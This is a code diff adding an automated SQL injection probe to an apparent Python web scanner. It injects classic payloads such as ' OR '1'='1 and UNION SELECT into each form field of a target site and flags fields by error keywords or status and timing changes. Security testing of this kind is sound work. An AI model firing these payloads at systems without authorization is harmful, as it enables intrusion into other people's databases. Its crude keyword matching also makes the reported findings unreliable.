@@ -77,13 +77,62 @@ def base_response(text):
         print(extracted_info)
         return extracted_info
 
-def sql_injection(extracted_info):
-    # step 1 get the fields of the forms.
+def sql_injection(form_text):
+    sql_payloads = ["'", "\" OR \"1\"=\"1", "' OR '1'='1", "1' UNION SELECT NULL--", "admin'--", "' OR 1=1--"]
+    sql_error_keywords = ["sql", "syntax", "error", "mysql", "sqlite", "oracle", "postgresql", "query", "database"]
     
-    # step 2: inject payload in a field.
-    # step 3: get the baseline response for the form.
-    # step 4: compare it to the injected field form.
-    # check for sqli injection error phrases in the response. 
-    # if the phrases exsists and the parameters like status code, content-length, and response time, have quite some difference return this field.
-    # print all such field, do not add it to any array or anything just start printing the field with the form whose field is vulnerable.
-# flow: Get base line for each form, inject payload in to 1 field at a time keep others with dummy data, then after each form, store the result in a list with format: [{form1_baseline:[base line for form one], form1_sql_payload:[after itirating through all fields then returns are stored here]}] compare these findings, then return the findings.
+    parsed_fields = parse_forms(form_text)
+    dummy_data = {
+        "username":"admin", 
+        "password":"administrator",
+        "email":"test@gmail.com",
+        "name":"john doe",
+        "age": "24",
+        "phone": "1234567890",
+        "search":"test",
+        "query": "test"
+    }
+    
+    for form_index, form in enumerate(parsed_fields):
+        baseline = base_response(form_text)
+        baseline_status = baseline[2]
+        baseline_time = baseline[1]
+        baseline_length = baseline[0]
+        
+        for field in form["form_data"]:
+            field_name = field["name"]
+            
+            for payload in sql_payloads:
+                form_data_to_send = {}
+                
+                for f in form["form_data"]:
+                    f_name = f["name"]
+                    if f_name == field_name:
+                        form_data_to_send[f_name] = payload
+                    elif f_name in dummy_data:
+                        form_data_to_send[f_name] = dummy_data[f_name]
+                    else:
+                        form_data_to_send[f_name] = "test_value"
+                
+                try:
+                    response = requests.post(form["action"], data=form_data_to_send, timeout=5)
+                    response_status = response.status_code
+                    response_time = response.elapsed.total_seconds()
+                    response_length = response.headers.get('Content-Length')
+                    response_text = response.text.lower()
+                    
+                    has_sql_error = any(keyword in response_text for keyword in sql_error_keywords)
+                    status_different = response_status != baseline_status
+                    time_different = abs(response_time - baseline_time) > 1
+                    
+                    if has_sql_error or status_different or time_different:
+                        print(f"\n[+] SQLI FOUND!")
+                        print(f"    Form Index: {form_index}")
+                        print(f"    Vulnerable Field: {field_name}")
+                        print(f"    Payload: {payload}")
+                        print(f"    Baseline Status: {baseline_status} | Response Status: {response_status}")
+                        print(f"    Baseline Time: {baseline_time} | Response Time: {response_time}")
+                        print(f"    SQL Error Keywords Found: {has_sql_error}")
+                        
+                except Exception as e:
+                    print(f"Error testing {field_name} with payload {payload}: {e}")
